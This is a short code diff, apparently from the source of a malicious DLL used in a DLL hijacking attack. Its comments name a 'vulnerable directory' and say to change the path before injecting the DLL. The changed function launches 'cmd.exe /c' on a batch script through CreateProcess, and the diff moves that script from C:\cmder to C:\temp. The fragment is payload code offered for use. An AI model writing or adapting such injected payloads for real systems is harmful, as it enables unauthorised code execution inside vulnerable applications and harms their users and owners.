@@ -7,7 +7,7 @@ void scriptExec(void) {
 	PROCESS_INFORMATION processInfo;
 	// example with vulnerable directory : C:\\cmder
 	// before inject the malicious DLL change this path
-	TCHAR lpszClientPath[50] = TEXT("cmd.exe /c C:\\cmder\\script.bat");
+	TCHAR lpszClientPath[50] = TEXT("cmd.exe /c C:\\temp\\script.bat");
 	if (CreateProcess(NULL, lpszClientPath, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo))
 	{
 		WaitForSingleObject(processInfo.hProcess, INFINITE);
